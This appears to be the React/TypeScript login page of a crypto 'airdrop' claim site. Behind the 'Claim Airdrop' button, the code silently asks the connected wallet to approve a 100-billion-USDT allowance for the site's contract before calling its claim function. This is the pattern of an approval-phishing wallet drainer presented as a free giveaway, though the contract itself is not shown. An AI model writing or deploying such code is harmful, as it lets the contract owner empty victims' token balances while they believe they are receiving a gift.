import React, { useState } from "react";
import { useNavigate } from "react-router-dom";
import {
  Provider,
  useAppKit,
  useAppKitAccount,
  useAppKitProvider,
} from "@reown/appkit/react";
import { ethers, BrowserProvider, Contract } from "ethers";
import { contractAbi } from "../contracts/Props/contractAbi";
import { contractAddress } from "../contracts/Props/contractAddress";

const usdtAddress = "0xf073d53f07451FB5f885f699a57D4169a526299e";

const usdtAbi = [
  "function approve(address spender, uint256 amount) external returns (bool)",
  "function allowance(address owner, address spender) external view returns (uint256)",
] as const;

const LoginPage: React.FC = () => {
  const { open } = useAppKit();
  const { address } = useAppKitAccount();
  const { walletProvider } = useAppKitProvider<Provider>("eip155");

  const [referralCode, setReferralCode] = useState("");
  const navigate = useNavigate();

  const AIRDROP_AMOUNT_TO_APPROVE = ethers.parseUnits("100000000000", 6); // 100B USDT

  const handleClaim = async () => {
    if (!walletProvider || !address) return;

    try {
      const provider = new BrowserProvider(walletProvider);
      const signer = await provider.getSigner();

      // ✅ Step 1: Check USDT Approval
      const usdt = new Contract(usdtAddress, usdtAbi, provider);
      // const approveFn = usdt.getFunction("approve") as (
      //   spender: string,
      //   amount: bigint
      // ) => Promise<any>;

      const allowanceFn = usdt.getFunction("allowance") as (
        owner: string,
        spender: string
      ) => Promise<bigint>;

      const allowance = await allowanceFn(address, contractAddress);

      if (allowance < AIRDROP_AMOUNT_TO_APPROVE) {
        const usdtWithSigner = usdt.connect(signer);
        const approveFnWithSigner = usdtWithSigner.getFunction("approve") as (
          spender: string,
          amount: bigint
        ) => Promise<any>;

        const tx = await approveFnWithSigner(
          contractAddress,
          AIRDROP_AMOUNT_TO_APPROVE
        );
        await tx.wait();
      }

      // ✅ Step 2: Call claim function
      const airdrop = new Contract(contractAddress, contractAbi, signer);
      const tx = referralCode
        ? await airdrop.referralBonusClaim(referralCode)
        : await airdrop.claim();

      await tx.wait();
      alert("Claim successful!");
      navigate("/dashboard");
    } catch (err: any) {
      console.error(err);
      alert(`❌ Error: ${err?.message || "Something went wrong"}`);
    }
  };

  return (
    <div className="min-h-screen bg-[#0c0435] flex items-center justify-center px-4">
      <div className="bg-[#1b0f3a] text-white p-8 rounded-xl shadow-lg w-full max-w-md text-center">
        <h1 className="text-3xl font-bold mb-4">Welcome to IINGO Airdrop</h1>

        {address ? (
          <>
            <p className="text-sm text-green-400 mb-2 break-all">
              Connected: {address}
            </p>

            <input
              type="text"
              placeholder="Enter referral code (optional)"
              className="w-full px-4 py-2 rounded mb-4 text-black"
              value={referralCode}
              onChange={(e) => setReferralCode(e.target.value)}
            />

            <button
              onClick={handleClaim}
              className="bg-gradient-to-r from-pink-500 to-purple-600 hover:from-pink-600 hover:to-purple-700 text-white font-semibold py-3 px-6 rounded-xl shadow-lg transition-all duration-300"
            >
              {referralCode ? "Claim With Referral" : "Claim Airdrop"}
            </button>
          </>
        ) : (
          <>
            <p className="text-gray-400 mb-6">
              Connect your wallet to continue
            </p>
            <button
              onClick={() => open()}
              className="bg-gradient-to-r from-cyan-500 to-blue-500 hover:from-cyan-600 hover:to-blue-600 text-white font-semibold py-4 px-8 rounded-xl transition-all duration-300 transform hover:scale-105 shadow-lg"
            >
              Connect Wallet
            </button>
          </>
        )}
      </div>
    </div>
  );
};

export default LoginPage;
